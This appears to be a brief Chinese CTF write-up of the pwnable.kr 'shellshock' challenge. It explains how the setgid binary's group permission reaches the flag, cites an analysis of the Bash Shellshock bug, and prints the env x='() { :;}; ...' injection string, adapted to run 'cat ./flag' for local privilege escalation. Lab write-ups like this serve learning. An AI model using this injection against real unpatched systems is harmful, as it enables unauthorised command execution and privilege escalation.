[TOC]

# 源码
![image](9128BF8EB9214C07904D1752C129033A)


# 权限问题：
    ls -l
```
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c

```
shellshock执行权限

owner | group | other
---|---|---
r+x |  r+s | r+x

可见shellshock 对group 设置SGID ，运行时程序egid = ownerid,

此时程序运行时具有shellshock_pwn 权限 ， 且该权限对flag可读。

这个破壳漏洞是可以作为一个本地提权漏洞使用，参考金山毒霸在freebuf上的漏洞分析贴，：http://www.freebuf.com/articles/system/45390.html

可以使用上面提到了poc，

env x='() { :;}; echo vulnerable' bash -c "echo this is a test" 

可验证这个漏洞在./bash上是存在的：

将echo v...' 换成想执行的命令 bash -c "cat ./flag"'

而./ bash -c "echo this is a test" 换成./shellshock
![image](F09017A9C7A04FDD8E3260457828B515)


普及：
![image](7A181CCEDCD542F6947E95A49E5102FE)